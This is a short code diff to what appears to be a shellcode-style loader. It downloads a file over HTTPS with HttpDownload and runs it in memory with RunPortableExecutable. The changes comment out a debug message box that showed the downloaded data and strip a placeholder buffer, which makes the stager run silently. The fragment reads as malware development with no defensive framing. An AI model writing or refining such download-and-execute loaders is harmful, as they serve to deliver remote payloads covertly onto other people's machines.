@@ -2,7 +2,7 @@
 
 //加载起始函数，跳转到入口函数
 #ifdef _WIN64
-VOID  mmLoaderSCStart(){
+VOID mmLoaderSCStart(){
 	Strat();
 #else
 VOID _declspec(naked) mmLoaderSCStart()
@@ -27,7 +27,6 @@ public:
 
 
 	Functions fn;
-	char s_runexe[260];
 	char* newbuff;
 
 
@@ -38,8 +37,8 @@ public:
 		
 		newbuff = NULL;
 		Initfunctions(&fn);
-		char runexe[] = { 'A', 'A','\0' };
-		fn.fnmemcpy(s_runexe, runexe, 260);
+		
+		
 	};
 
 
@@ -67,7 +66,7 @@ public:
 
 		int size = HttpDownload(host, path, 443, TRUE);
 
-		fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
+		//fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
 	
 		RunPortableExecutable();
 
